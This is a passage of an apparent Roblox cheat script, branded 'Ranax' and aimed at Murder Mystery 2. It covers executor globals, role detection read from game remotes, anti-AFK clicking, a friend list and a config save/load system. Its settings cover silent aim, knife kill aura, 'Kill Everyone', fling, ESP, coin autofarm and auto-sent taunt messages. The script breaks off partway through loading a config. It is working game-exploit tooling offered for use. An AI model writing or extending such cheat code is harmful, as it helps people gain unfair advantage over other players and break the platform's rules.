getgenv().VertexNotify = RxNotify

local function notify(title, text, dur, icon)
    if getgenv().RanaxNotifyEnabled == false then return end
    if getgenv().RanaxToastEnabled ~= false then
        RxNotify(title, text, dur or 3)
    else
        pcall(function()
            WindUI:Notify({ Title = tostring(title or "Ranax"), Content = tostring(text or ""), Duration = tonumber(dur) or 3, Icon = icon or "check" })
        end)
    end
end

-- ==================== EARLY STATE INITIALIZATION ====================
local UIElements = {}
local KeybindValues = {
    GUIKeybind = "LeftControl",
    GrabGunKeybind = "None",
    GhostKeybind = "None",
    SpeedGlitchKeybind = "None",
    InvisibleKeybind = "None",
    ShootV2Keybind = "Q",
    FlickV2Keybind = "None",
    SilentAimKeybind = "None",
    RanaxFlickKeybind = "None",
    KillEveryoneKeybind = "None",
    ThrowKnifeKeybind = "None",
    CoinFarmKeybind = "None",
    EmoteKeybind = "None",
}
pcall(function()
    if getgenv then
        getgenv().RanaxUI = UIElements
        getgenv().KeybindValues = KeybindValues
    end
end)
getgenv().RanaxMM2 = getgenv().RanaxMM2 or {}
local V = getgenv().RanaxMM2
if V.AutoKnife == nil then V.AutoKnife = false end
if V.SilentKnifeThrow == nil then V.SilentKnifeThrow = false end
if V.KnifeWallCheck == nil then V.KnifeWallCheck = true end
if V.KnifeThrowPriority == nil then V.KnifeThrowPriority = "Sheriff First" end
if V.KnifeThrowSpeed == nil then V.KnifeThrowSpeed = 150 end
if V.KnifePrediction == nil then V.KnifePrediction = 1.0 end
if V.KnifeMaxDistance == nil then V.KnifeMaxDistance = 350 end
if V.KnifeThrowDelay == nil then V.KnifeThrowDelay = 0.4 end
if V.RoleNotify == nil then V.RoleNotify = true end
if V.ProtectFriends == nil then V.ProtectFriends = true end
if getgenv().RanaxToastEnabled == nil then getgenv().RanaxToastEnabled = true end
if getgenv().RanaxFlingStop == nil then getgenv().RanaxFlingStop = false end
if getgenv().RanaxFlingActive == nil then getgenv().RanaxFlingActive = false end
if getgenv().RanaxFlingDepth == nil then getgenv().RanaxFlingDepth = 0 end
if V.AntiFling == nil then V.AntiFling = true end
if V.AntiFlingThreshold == nil then V.AntiFlingThreshold = 250 end
if V.SheriffDeathNotify == nil then V.SheriffDeathNotify = true end
if getgenv().RanaxNotifyEnabled == nil then getgenv().RanaxNotifyEnabled = true end
if getgenv().GUIKeybind == nil then getgenv().GUIKeybind = "LeftControl" end
if _G.AutoChatMurdDeath == nil then _G.AutoChatMurdDeath = false end
if _G.AutoChatMurdDeathMsg == nil or _G.AutoChatMurdDeathMsg == "" then _G.AutoChatMurdDeathMsg = "ez" end
if _G.AutoChatKill == nil then _G.AutoChatKill = false end
if _G.AutoChatKillMsg == nil or _G.AutoChatKillMsg == "" then _G.AutoChatKillMsg = "ez" end

-- ==================== SAFE MULTI-SYSTEM CHAT EMITTER ====================
local function sendRobloxChatMessage(msg)
    if not msg or msg == "" then return end
    task.spawn(function()
        pcall(function()
            local TextChatService = game:GetService("TextChatService")
            if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local textChannels = TextChatService:FindFirstChild("TextChannels")
                local general = textChannels and (textChannels:FindFirstChild("RBXGeneral") or textChannels:FindFirstChild("General"))
                if general then
                    general:SendAsync(tostring(msg))
                    return
                end
            end
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            local sayReq = events and events:FindFirstChild("SayMessageRequest")
            if sayReq and sayReq:IsA("RemoteEvent") then
                sayReq:FireServer(tostring(msg), "All")
                return
            end
            local say = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
            if say and say:IsA("RemoteEvent") then
                say:FireServer(tostring(msg), "All")
            end
        end)
    end)
end
_G.sendRobloxChatMessage = sendRobloxChatMessage

-- Ranax Advanced MM2 Shoot Settings for Sheriff
if V.RanaxPredictOffset == nil then V.RanaxPredictOffset = 2.8 end
if V.RanaxFlickEnabled == nil then V.RanaxFlickEnabled = false end
if V.RanaxFlickCamera == nil then V.RanaxFlickCamera = false end
if V.RanaxFlickTurnTime == nil then V.RanaxFlickTurnTime = 0.08 end
if V.RanaxFlickKeybind == nil then V.RanaxFlickKeybind = "None" end
if V.RanaxWallCheck == nil then V.RanaxWallCheck = true end
if V.RanaxAutoShoot == nil then V.RanaxAutoShoot = false end
if V.RanaxFovRadius == nil then V.RanaxFovRadius = 120 end
if V.RanaxFovShow == nil then V.RanaxFovShow = false end
if V.RanaxShootDelay == nil then V.RanaxShootDelay = 0.1 end

-- ==================== SAFE MULTI-GAME REMOTE DETECTION ====================
local Remotes = nil
local FadeEvent = nil
local DataChangedEvent = nil
local RoundEndEvent = nil
local RoundStartEvent = nil

pcall(function()
    local r = ReplicatedStorage:FindFirstChild("Remotes")
    if r then
        Remotes = r:FindFirstChild("Gameplay") or r
    else
        Remotes = ReplicatedStorage:FindFirstChild("Gameplay") or ReplicatedStorage
    end
    if Remotes then
        FadeEvent = Remotes:FindFirstChild("Fade")
        DataChangedEvent = Remotes:FindFirstChild("PlayerDataChanged")
        RoundEndEvent = Remotes:FindFirstChild("RoundEndFade")
        RoundStartEvent = Remotes:FindFirstChild("TeleportToPart")
    end
end)

local GlobalPlayerRoles = {}
local lastNotifiedRole = nil
local roleNotificationDebounce = false
local currentRoundToken = 0

local function checkAndNotifyMyRole()
    if not V.RoleNotify then return end
    if roleNotificationDebounce then return end
    roleNotificationDebounce = true
    
    local thisToken = currentRoundToken
    task.delay(0.9, function()
        roleNotificationDebounce = false
        if thisToken ~= currentRoundToken then return end
        
        local myRole = "Innocent"
        local myIdStr = tostring(LocalPlayer.UserId)
        local myName = LocalPlayer.Name
        
        if GlobalPlayerRoles and typeof(GlobalPlayerRoles) == "table" then
            for id, data in pairs(GlobalPlayerRoles) do
                if (tostring(id) == myIdStr or id == myName) and data and typeof(data) == "table" and data.Role then
                    myRole = data.Role
                    break
                end
            end
        end
        
        local char = LocalPlayer.Character
        local bp = LocalPlayer:FindFirstChild("Backpack")
        local function hasTool(name)
            return (char and char:FindFirstChild(name)) or (bp and bp:FindFirstChild(name))
        end
        
        if hasTool("Knife") then
            myRole = "Murderer"
        elseif hasTool("Gun") or hasTool("Revolver") then
            if myRole ~= "Sheriff" then
                myRole = "Hero"
            end
        end
        
        if myRole ~= lastNotifiedRole then
            lastNotifiedRole = myRole
            local icon = "shield"
            if myRole == "Murderer" then
                icon = "skull"
            elseif myRole == "Sheriff" then
                icon = "crosshair"
            elseif myRole == "Hero" then
                icon = "award"
            end
            notify("Game", "Your Role: " .. tostring(myRole), 4, icon)
        end
    end)
end

if FadeEvent then
    pcall(function()
        FadeEvent.OnClientEvent:Connect(function(data)
            if typeof(data) == "table" then
                GlobalPlayerRoles = data
                getgenv().PlayerRoles = data
                getgenv().NameRoles = data
                checkAndNotifyMyRole()
            end
        end)
    end)
end

if DataChangedEvent then
    pcall(function()
        DataChangedEvent.OnClientEvent:Connect(function(data)
            if typeof(data) == "table" then
                GlobalPlayerRoles = data
                getgenv().PlayerRoles = data
                getgenv().NameRoles = data
                checkAndNotifyMyRole()
            end
        end)
    end)
end

local RoleColors = {
    Murderer = Color3.fromRGB(255, 35, 35),
    Sheriff = Color3.fromRGB(0, 160, 255),
    Hero = Color3.fromRGB(255, 225, 20),
    Innocent = Color3.fromRGB(0, 255, 120)
}

local function resetLobbyRoles()
    currentRoundToken = currentRoundToken + 1
    GlobalPlayerRoles = {}
    getgenv().PlayerRoles = {}
    getgenv().NameRoles = {}
    lastNotifiedRole = nil
    roleNotificationDebounce = false
    
    pcall(function()
        if getgenv().PlayerESPObjects then
            for _, esp in pairs(getgenv().PlayerESPObjects) do
                if esp then
                    esp.FillColor = RoleColors.Innocent
                    esp.OutlineColor = RoleColors.Innocent
                end
            end
        end
        if getgenv().NameESPObjects then
            for _, esp in pairs(getgenv().NameESPObjects) do
                if esp then
                    local label = esp:FindFirstChildOfClass("TextLabel")
                    if label then
                        label.TextColor3 = RoleColors.Innocent
                    end
                end
            end
        end
    end)
end

_G.RanaxRoundInProgress = false

if RoundEndEvent then
    pcall(function()
        RoundEndEvent.OnClientEvent:Connect(function()
            _G.RanaxRoundInProgress = false
            _G.CoinFarmHandlingBagFull = false
            _G.DiedThisRound = false
            _G.MurdererDiedThisRound = false
            _currentTrackedMurderer = nil
            _G.HasReportedCoins = false
            _G.RanaxCoinsCollected = 0
            _G.BlacklistedCoins = {}
            if typeof(_RanaxCoinCache) == "table" then table.clear(_RanaxCoinCache) end
            cachedCoinLabel = nil
            _detectedMurderer = nil
            resetLobbyRoles()
            if _G.CoinTween then _G.CoinTween:Cancel(); _G.CoinTween = nil end
            if typeof(removeCoinFarmPlatform) == "function" then pcall(removeCoinFarmPlatform) end
        end)
    end)
end

if RoundStartEvent then
    pcall(function()
        RoundStartEvent.OnClientEvent:Connect(function()
            _G.RanaxRoundInProgress = true
            _G.RanaxRoundStartTime = os.time()
            _G.CoinFarmHandlingBagFull = false
            _G.DiedThisRound = false
            _G.MurdererDiedThisRound = false
            _currentTrackedMurderer = nil
            _G.HasTeleportedAboveFirst = false
            _G.HasReportedCoins = false
            _G.RanaxCoinsCollected = 0
            _G.BlacklistedCoins = {}
            if typeof(_RanaxCoinCache) == "table" then table.clear(_RanaxCoinCache) end
            cachedCoinLabel = nil
            _detectedMurderer = nil
            currentRoundToken = currentRoundToken + 1
            lastNotifiedRole = nil
            checkAndNotifyMyRole()
            task.delay(0.5, function()
                if typeof(_rebuildCoinCache) == "function" then
                    pcall(_rebuildCoinCache)
                end
            end)
        end)
    end)
end

local function hookLocalInventory(char)
    if not char then return end
    char.ChildAdded:Connect(function(child)
        if child:IsA("Tool") then
            checkAndNotifyMyRole()
        end
    end)
end
if LocalPlayer.Character then hookLocalInventory(LocalPlayer.Character) end
LocalPlayer.CharacterAdded:Connect(function(char)
    hookLocalInventory(char)
    checkAndNotifyMyRole()
end)

-- ==================== ANTI-AFK ====================
_G.RanaxAntiAFK = true  -- default ON

-- Idled event handler
LocalPlayer.Idled:Connect(function()
    if _G.RanaxAntiAFK then
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end
end)

-- Periodic VirtualUser loop (belt-and-suspenders)
task.spawn(function()
    while true do
        task.wait(55)  -- every ~55 sec, before the 60s AFK timeout
        if _G.RanaxAntiAFK then
            pcall(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end)
        end
    end
end)

pcall(function()
    local Event = ReplicatedStorage:FindFirstChild("ChatMessage")
    if Event and Event:IsA("BindableEvent") then
        Event:Fire({ text = "[Private] Ranax Loaded. ™" })
    elseif typeof(firesignal) == "function" and Event then
        firesignal(Event.OnClientEvent, { text = "[Private] Ranax Loaded. ™" })
    end
end)
-------------------------------------------------------------------------------------------------------------------
-- ==================== FRIEND SYSTEM (Ranax Ultra Protection) ====================
local FRIEND_FILE = "Ranax_Friends.json"
getgenv().Friends = getgenv().Friends or {}
getgenv().FriendSystemEnabled = true
getgenv().FriendColor = Color3.fromRGB(255, 140, 0) -- Canli Turuncu

local function LoadFriends()
    if not (readfile and isfile) then return end
    pcall(function()
        if isfile(FRIEND_FILE) then
            local data = HttpService:JSONDecode(readfile(FRIEND_FILE))
            if typeof(data) == "table" then
                getgenv().Friends = data
            end
        end
    end)
end

local function SaveFriends()
    if not writefile then return end
    pcall(function()
        writefile(FRIEND_FILE, HttpService:JSONEncode(getgenv().Friends))
    end)
end

local function IsFriend(player)
    if not player then return false end
    if not getgenv().FriendSystemEnabled then return false end
    
    if typeof(player) == "Instance" and player:IsA("Model") then
        local p = Players:GetPlayerFromCharacter(player)
        if p then player = p else return false end
    end
    
    local f = getgenv().Friends or {}
    
    if not (typeof(player) == "Instance" and player:IsA("Player")) then
        local nameStr = tostring(player):lower():gsub("^%s+", ""):gsub("%s+$", "")
        for key, val in pairs(f) do
            if tostring(key):lower() == nameStr or tostring(val):lower() == nameStr then
                return true
            end
        end
        return false
    end

    local pName = player.Name:lower()
    local pDisp = (player.DisplayName or ""):lower()
    local pUid  = tostring(player.UserId)

    for key, val in pairs(f) do
        local kStr = tostring(key):lower()
        local vStr = tostring(val):lower()
        if kStr == pName or vStr == pName
            or (pDisp ~= "" and (kStr == pDisp or vStr == pDisp))
            or kStr == pUid or vStr == pUid then
            return true
        end
    end

    return false
end

local function isProtected(plr)
    if not plr then return false end
    return IsFriend(plr)
end

local function AddFriend(name)
    if not name or name:match("^%s*$") then return false end
    if not getgenv().Friends then getgenv().Friends = {} end
    local clean = name:gsub("^%s+", ""):gsub("%s+$", "")
    
    local foundPlr = nil
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == clean:lower() or (p.DisplayName and p.DisplayName:lower() == clean:lower()) or tostring(p.UserId) == clean then
            foundPlr = p
            break
        end
    end
    
    if foundPlr then
        getgenv().Friends[foundPlr.Name] = tostring(foundPlr.UserId)
        getgenv().Friends[tostring(foundPlr.UserId)] = foundPlr.Name
        if foundPlr.DisplayName and foundPlr.DisplayName ~= "" and foundPlr.DisplayName ~= foundPlr.Name then
            getgenv().Friends[foundPlr.DisplayName] = foundPlr.Name
        end
    else
        getgenv().Friends[clean] = clean
    end
    SaveFriends()
    return true
end

local function RemoveFriend(name)
    if not name or name == "" then return false end
    local f = getgenv().Friends or {}
    local targetClean = tostring(name):lower()
    
    for key, val in pairs(f) do
        if tostring(key):lower() == targetClean or tostring(val):lower() == targetClean then
            f[key] = nil
        end
    end
    SaveFriends()
    return true
end

local function GetFriendList()
    local list = {}
    local seen = {}
    for key, val in pairs(getgenv().Friends or {}) do
        local entry = tostring(key)
        if not entry:match("^%d+$") and not seen[entry:lower()] then
            seen[entry:lower()] = true
            list[#list + 1] = entry
        end
    end
    table.sort(list)
    if #list == 0 then list = {"No friends"} end
    return list
end

LoadFriends()
-------------------------------------------------------------------------------------------------------------------
-- ==================== CONFIG SYSTEM (Ranax Preset Manager) ====================
local CONFIG_DIR = "Ranax_Configs"
local CurrentConfigName = "default"

pcall(function()
    if getgenv then
        if not getgenv().RanaxUI then getgenv().RanaxUI = UIElements end
        if not getgenv().KeybindValues then getgenv().KeybindValues = KeybindValues end
    end
end)

local function getKey(kbRef, keyName, defaultVal)
    if kbRef then
        if kbRef.Value and kbRef.Value ~= "" and tostring(kbRef.Value) ~= "nil" then
            return tostring(kbRef.Value):gsub("Enum%.KeyCode%.", "")
        elseif kbRef.Key and kbRef.Key ~= "" and tostring(kbRef.Key) ~= "nil" then
            return tostring(kbRef.Key):gsub("Enum%.KeyCode%.", "")
        end
    end
    if KeybindValues and KeybindValues[keyName] then
        return KeybindValues[keyName]
    end
    return defaultVal or "None"
end

local function applyKey(kbRef, keyName, val)
    if not val or val == "" then val = "None" end
    val = tostring(val):gsub("Enum%.KeyCode%.", "")
    KeybindValues[keyName] = val
    pcall(function()
        if getgenv and getgenv().KeybindValues then
            getgenv().KeybindValues[keyName] = val
        end
    end)
    if kbRef then
        pcall(function()
            if typeof(kbRef.Set) == "function" then
                kbRef:Set(val)
            elseif typeof(kbRef.SetValue) == "function" then
                kbRef:SetValue(val)
            elseif typeof(kbRef.SetKey) == "function" then
                kbRef:SetKey(val)
            end
        end)
    end
    if keyName == "GUIKeybind" and val ~= "None" and Enum.KeyCode[val] then
        pcall(function() Window:SetToggleKey(Enum.KeyCode[val]) end)
    end
end

local function setUIVal(element, val)
    if not element then return end
    pcall(function()
        if typeof(element.Set) == "function" then
            element:Set(val)
        elseif typeof(element.SetValue) == "function" then
            element:SetValue(val)
        elseif typeof(element.SetState) == "function" then
            element:SetState(val)
        elseif typeof(element.Select) == "function" then
            element:Select(val)
        elseif typeof(element.Update) == "function" then
            element:Update(val)
        elseif element.Value ~= nil then
            element.Value = val
        end
    end)
end

local function EnsureConfigDir()
    pcall(function()
        if makefolder and isfolder and not isfolder(CONFIG_DIR) then
            makefolder(CONFIG_DIR)
        end
    end)
end

local function GetConfigList()
    local list = {}
    local seen = {}
    EnsureConfigDir()
    pcall(function()
        if listfiles then
            if isfolder and isfolder(CONFIG_DIR) then
                for _, p in ipairs(listfiles(CONFIG_DIR)) do
                    local name = p:match("([^/\\]+)%.json$")
                    if name and not seen[name] then
                        table.insert(list, name)
                        seen[name] = true
                    end
                end
            end
            -- Also check root directory for Ranax_*.json
            for _, p in ipairs(listfiles("")) do
                local name = p:match("Ranax_([^/\\]+)%.json$")
                if name and not seen[name] then
                    table.insert(list, name)
                    seen[name] = true
                end
            end
        end
    end)
    if #list == 0 then
        table.insert(list, "default")
    end
    return list
end


-- ==================== FORWARD DECLARATIONS FOR CONFIG SYSTEM ====================
local PlayerESPToggle = nil
local NameESPToggle = nil
local GunDropToggle = nil
local TrapESPToggle = nil
local AutoGrabGunToggle = nil
local RemoveBarrierAutomaticToggle = nil
local GhostModeToggle = nil
local GameStatusHUDToggle = nil

local function SaveConfig(name)
    if not name or name:match("^%s*$") then name = "default" end
    EnsureConfigDir()
    
    local configData = {
        -- ===== KEYBINDS =====
        GUIKeybind          = getKey(UIElements.Keybind,             "GUIKeybind",          "LeftControl"),
        GrabGunKeybind      = getKey(UIElements.GrabGunKeybind,      "GrabGunKeybind",      "None"),
        GhostKeybind        = getKey(UIElements.GhostKeybind,        "GhostKeybind",        "None"),
        SpeedGlitchKeybind  = getKey(UIElements.SpeedGlitchKeybind,  "SpeedGlitchKeybind",  "None"),
        InvisibleKeybind    = getKey(UIElements.InvisibleKeybind,    "InvisibleKeybind",    "None"),
        ShootV2Keybind      = getKey(UIElements.ShootV2Keybind,      "ShootV2Keybind",      "Q"),
        FlickV2Keybind      = getKey(UIElements.FlickV2Keybind,      "FlickV2Keybind",      "None"),
        KillEveryoneKeybind = getKey(UIElements.KillEveryoneKeybind, "KillEveryoneKeybind", "None"),
        ThrowKnifeKeybind   = getKey(UIElements.ThrowKnifeKeybind,   "ThrowKnifeKeybind",   "None"),
        CoinFarmKeybind     = getKey(UIElements.CoinFarmKeybind,     "CoinFarmKeybind",     "None"),
        WallhopKeybind      = getKey(UIElements.WallhopKeybind,      "WallhopKeybind",      "None"),
        JerkKeybind         = getKey(UIElements.JerkKeybind,         "JerkKeybind",         "J"),
        EmoteKeybind        = getKey(UIElements.EmoteKeybind,        "EmoteKeybind",        "None"),

        -- ===== ESP MODULES =====
        PlayerESP           = (UIElements.PlayerESPToggle and UIElements.PlayerESPToggle.Value) or (PlayerESPToggle and PlayerESPToggle.Value) or (getgenv().PlayerESPActive == true) or false,
        NameESP             = (UIElements.NameESPToggle and UIElements.NameESPToggle.Value) or (NameESPToggle and NameESPToggle.Value) or (getgenv().NameESPActive == true) or false,
        GunDropESP          = (UIElements.GunDropToggle and UIElements.GunDropToggle.Value) or (GunDropToggle and GunDropToggle.Value) or false,
        TrapESP             = (UIElements.TrapESPToggle and UIElements.TrapESPToggle.Value) or (TrapESPToggle and TrapESPToggle.Value) or false,
        CoinESP             = (UIElements.ESPCoinToggle and UIElements.ESPCoinToggle.Value) or (UIElements.CoinESPToggle and UIElements.CoinESPToggle.Value) or (_G.CoinESPEnabled == true) or false,

        -- ===== KNIFE TOOLS & KILL AURA =====
        KnifeKillAuraEnabled  = _G.KnifeKillAuraEnabled or false,
        KnifeKillAuraDistance = _G.KnifeKillAuraDistance or 14,
        SilentKnifeThrow      = V.SilentKnifeThrow or false,
        KnifeWallCheck        = V.KnifeWallCheck ~= false,
        KnifeThrowPriority    = V.KnifeThrowPriority or "Sheriff First",
        KnifeThrowSpeed       = V.KnifeThrowSpeed or 150,
        KnifePrediction       = V.KnifePrediction or 1.0,
        KnifeMaxDistance      = V.KnifeMaxDistance or 350,
        KnifeThrowDelay       = V.KnifeThrowDelay or 0.4,
        AutoKnife             = V.AutoKnife or false,

        -- ===== SHERIFF SHOOT =====
        RanaxShootingMethod       = _G.RanaxShootingMethod or "New (blatant)",
        RanaxSilentAimWallCheck   = _G.RanaxSilentAimWallCheck ~= false,
        RanaxPredictionMultiplier = _G.RanaxPredictionMultiplier or 1.8,
        RanaxAutoShootV2          = _G.RanaxAutoShootV2 or false,
        ShootV2FlickEnabled       = _G.ShootV2FlickEnabled or false,
        ShootV2FlickCamera        = _G.ShootV2FlickCamera or false,
        ShootV2FlickTurnTime      = _G.ShootV2FlickTurnTime or 0.08,
        SheriffKillCamEnabled     = _G.SheriffKillCamEnabled ~= false,
        SheriffKillSound          = _G.SheriffKillSound ~= false,
        SheriffKillBanner         = _G.SheriffKillBanner ~= false,
        SheriffKillEffectStyle    = _G.SheriffKillEffectStyle or "All Combined",
        SheriffKillCamDuration    = _G.SheriffKillCamDuration or 1.8,

        -- ===== COIN FARM =====
        SafeAutoFarm             = _G.SafeAutoFarm or false,
        UndergroundFarm          = _G.UndergroundFarm ~= nil and _G.UndergroundFarm or true,
        FarmSpeed                = _G.FarmSpeed or 24,
        BagFullAction            = _G.BagFullAction or "Auto by Role (Kill/Fling/Reset)",
        RanaxAntiAFK             = _G.RanaxAntiAFK ~= false,
        WebhookURL               = _G.WebhookURL or "",
        WebhookEnabled           = _G.WebhookEnabled or false,
        LevelUpWebhook           = (UIElements.LevelUpWebhook and UIElements.LevelUpWebhook.Value) or false,
        CoinFarmAntiStuck        = _G.CoinFarmAntiStuck ~= false,
        CoinFarmAntiStuckTimeout = _G.CoinFarmAntiStuckTimeout or 2.5,

        -- ===== WALLHOP & JERK =====
        WallhopTurnTime     = _G.WallhopTurnTime or 0.06,
        WallhopAutoJump     = _G.WallhopAutoJump ~= false,
        WallhopCameraSnap   = _G.WallhopCameraSnap ~= false,
        JerkSpeed           = _G.JerkSpeed or 1.0,

        -- ===== EMOTES =====
        SelectedEmote       = _G.RanaxSelectedEmote or "Zen (MM2)",
        EmoteLoop           = _G.RanaxEmoteLoop ~= false,
        EmoteWalk           = _G.RanaxEmoteWalk ~= false,
        EmoteSpeed          = _G.RanaxEmoteSpeed or 1.0,

        -- ===== SKIN CHANGER =====
        KnifeSkinEnabled    = (_skinChanger and _skinChanger.KnifeEnabled) or false,
        SelectedKnife       = (_skinChanger and _skinChanger.SelectedKnife) or "Default",
        GunSkinEnabled      = (_skinChanger and _skinChanger.GunEnabled) or false,
        SelectedGun         = (_skinChanger and _skinChanger.SelectedGun) or "Default",
        ChromaRainbow       = (_skinChanger and _skinChanger.ChromaRainbow) or false,
        ChromaSpeed         = (_skinChanger and _skinChanger.ChromaSpeed) or 1.0,
        WeaponGlow          = (_skinChanger and _skinChanger.WeaponGlow) or false,
        WeaponScale         = (_skinChanger and _skinChanger.WeaponScale) or 1.0,

        -- ===== MISC & UTILITIES =====
        AutoGrabGun         = (UIElements.AutoGrabGunToggle and UIElements.AutoGrabGunToggle.Value) or (AutoGrabGunToggle and AutoGrabGunToggle.Value) or (getgenv().AutoGrabGunActive == true) or false,
        RemoveBarriers      = (UIElements.RemoveBarrierAutomaticToggle and UIElements.RemoveBarrierAutomaticToggle.Value) or (RemoveBarrierAutomaticToggle and RemoveBarrierAutomaticToggle.Value) or (getgenv().RemoveBarrierAutomaticActive == true) or false,
        SpeedGlitch         = _G.SpeedGlitchActive or false,
        SpeedGlitchBoost    = _G.SpeedGlitchBoost or 50,
        RanaxSprayDecalID   = _G.RanaxSprayDecalID or "18933215907",
        AutoChatMurdDeath   = _G.AutoChatMurdDeath or false,
        AutoChatMurdDeathMsg = _G.AutoChatMurdDeathMsg or "ez",
        AutoChatKill        = _G.AutoChatKill or false,
        AutoChatKillMsg     = _G.AutoChatKillMsg or "ez",

        -- ===== PROTECTION & NOTIFICATIONS =====
        AntiFling           = V.AntiFling ~= nil and V.AntiFling or true,
        AntiFlingThreshold  = V.AntiFlingThreshold or 250,
        ProtectFriends      = V.ProtectFriends ~= false,
        FriendSystemEnabled = getgenv().FriendSystemEnabled ~= false,
        RanaxToastEnabled   = getgenv().RanaxToastEnabled ~= false,
        RanaxNotifyEnabled  = getgenv().RanaxNotifyEnabled ~= false,
        RoleNotify          = V.RoleNotify ~= false,
        SheriffDeathNotify  = V.SheriffDeathNotify ~= false,
        FpsBoosterActive    = _G.FpsBoosterActive or false,
    }
    
    local jsonStr = HttpService:JSONEncode(configData)
    local filePath = CONFIG_DIR .. "/" .. name .. ".json"
    local flatPath = "Ranax_" .. name .. ".json"
    
    local writeSuccess = false
    if writefile then
        local ok1 = pcall(function() writefile(filePath, jsonStr) end)
        if ok1 then
            writeSuccess = true
        else
            local ok2 = pcall(function() writefile(flatPath, jsonStr) end)
            if ok2 then writeSuccess = true end
        end
    end

    if writeSuccess then
        CurrentConfigName = name
        return true, name
    end
    return false, "Write error"
end

local function LoadConfig(name)
    if not name or name:match("^%s*$") then name = "default" end
    EnsureConfigDir()
    local filePath = CONFIG_DIR .. "/" .. name .. ".json"
    local flatPath = "Ranax_" .. name .. ".json"
    
    local rawJson = nil
    pcall(function()
        if readfile then
            local ok1, c1 = pcall(function() return readfile(filePath) end)
            if ok1 and c1 and c1 ~= "" then
                rawJson = c1
            else
                local ok2, c2 = pcall(function() return readfile(flatPath) end)
                if ok2 and c2 and c2 ~= "" then
                    rawJson = c2
                end
            end
        end
    end)

    if rawJson then
        local success, result = pcall(function()
            local decoded = HttpService:JSONDecode(rawJson)
            if typeof(decoded) == "table" then
                -- Keybinds
                if decoded.GUIKeybind ~= nil then applyKey(UIElements.Keybind, "GUIKeybind", decoded.GUIKeybind) end
                if decoded.GrabGunKeybind ~= nil then applyKey(UIElements.GrabGunKeybind, "GrabGunKeybind", decoded.GrabGunKeybind) end
                if decoded.GhostKeybind ~= nil then applyKey(UIElements.GhostKeybind, "GhostKeybind", decoded.GhostKeybind) end
                if decoded.SpeedGlitchKeybind ~= nil then applyKey(UIElements.SpeedGlitchKeybind, "SpeedGlitchKeybind", decoded.SpeedGlitchKeybind) end
                if decoded.InvisibleKeybind ~= nil then applyKey(UIElements.InvisibleKeybind, "InvisibleKeybind", decoded.InvisibleKeybind) end
                if decoded.ShootV2Keybind ~= nil then applyKey(UIElements.ShootV2Keybind, "ShootV2Keybind", decoded.ShootV2Keybind) end
                if decoded.FlickV2Keybind ~= nil then applyKey(UIElements.FlickV2Keybind, "FlickV2Keybind", decoded.FlickV2Keybind) end
                if decoded.KillEveryoneKeybind ~= nil then applyKey(UIElements.KillEveryoneKeybind, "KillEveryoneKeybind", decoded.KillEveryoneKeybind) end
                if decoded.ThrowKnifeKeybind ~= nil then applyKey(UIElements.ThrowKnifeKeybind, "ThrowKnifeKeybind", decoded.ThrowKnifeKeybind) end
                if decoded.CoinFarmKeybind ~= nil then applyKey(UIElements.CoinFarmKeybind, "CoinFarmKeybind", decoded.CoinFarmKeybind) end
                if decoded.WallhopKeybind ~= nil then applyKey(UIElements.WallhopKeybind, "WallhopKeybind", decoded.WallhopKeybind) end
                if decoded.JerkKeybind ~= nil then applyKey(UIElements.JerkKeybind, "JerkKeybind", decoded.JerkKeybind) end
    if decoded.EmoteKeybind ~= nil then applyKey(UIElements.EmoteKeybind, "EmoteKeybind", decoded.EmoteKeybind) end
                -- ESP Settings
                if decoded.PlayerESP ~= nil then setUIVal(PlayerESPToggle, decoded.PlayerESP) end
                if decoded.NameESP ~= nil then setUIVal(NameESPToggle, decoded.NameESP) end
                if decoded.GunDropESP ~= nil then setUIVal(GunDropToggle, decoded.GunDropESP) end
                if decoded.TrapESP ~= nil then setUIVal(TrapESPToggle, decoded.TrapESP) end
                if decoded.CoinESP ~= nil then
                    _G.CoinESPEnabled = decoded.CoinESP
                    setUIVal(UIElements.CoinESPToggle or UIElements.ESPCoinToggle, decoded.CoinESP)
                end

                -- Wallhop & Jerk Settings
                if decoded.WallhopAutoJump ~= nil then
                    _G.WallhopAutoJump = decoded.WallhopAutoJump
                    setUIVal(UIElements.WallhopAutoJump, decoded.WallhopAutoJump)
                end
                if decoded.WallhopTurnTime ~= nil then
                    _G.WallhopTurnTime = decoded.WallhopTurnTime
                    setUIVal(UIElements.WallhopTurnTime, decoded.WallhopTurnTime)
                end
                if decoded.WallhopCameraSnap ~= nil then
                    _G.WallhopCameraSnap = decoded.WallhopCameraSnap
                    setUIVal(UIElements.WallhopCameraSnap, decoded.WallhopCameraSnap)
                end
                if decoded.JerkSpeed ~= nil then
                    _G.JerkSpeed = decoded.JerkSpeed
                    setUIVal(UIElements.JerkSpeed, decoded.JerkSpeed)
                end

                -- Knife Tools & Kill Aura
                if decoded.KnifeKillAuraEnabled ~= nil then
                    _G.KnifeKillAuraEnabled = decoded.KnifeKillAuraEnabled
                    setUIVal(UIElements.KnifeKillAuraToggle, decoded.KnifeKillAuraEnabled)
                end
                if decoded.KnifeKillAuraDistance ~= nil then
                    _G.KnifeKillAuraDistance = decoded.KnifeKillAuraDistance
                    setUIVal(UIElements.KnifeKillAuraDistance, decoded.KnifeKillAuraDistance)
                end
                if decoded.SilentKnifeThrow ~= nil then
                    V.SilentKnifeThrow = decoded.SilentKnifeThrow
                    setUIVal(UIElements.SilentKnifeThrow, decoded.SilentKnifeThrow)
                end
                if decoded.KnifeWallCheck ~= nil then
                    V.KnifeWallCheck = decoded.KnifeWallCheck
                    setUIVal(UIElements.KnifeWallCheck, decoded.KnifeWallCheck)
                end
                if decoded.KnifeThrowPriority ~= nil then
                    V.KnifeThrowPriority = decoded.KnifeThrowPriority
                    setUIVal(UIElements.KnifeThrowPriority, decoded.KnifeThrowPriority)
                end
                if decoded.KnifeThrowSpeed ~= nil then
                    V.KnifeThrowSpeed = decoded.KnifeThrowSpeed
                    setUIVal(UIElements.KnifeThrowSpeed, decoded.KnifeThrowSpeed)
                end
                if decoded.KnifePrediction ~= nil then
                    V.KnifePrediction = decoded.KnifePrediction
                    setUIVal(UIElements.KnifePrediction, decoded.KnifePrediction)
                end
                if decoded.KnifeMaxDistance ~= nil then
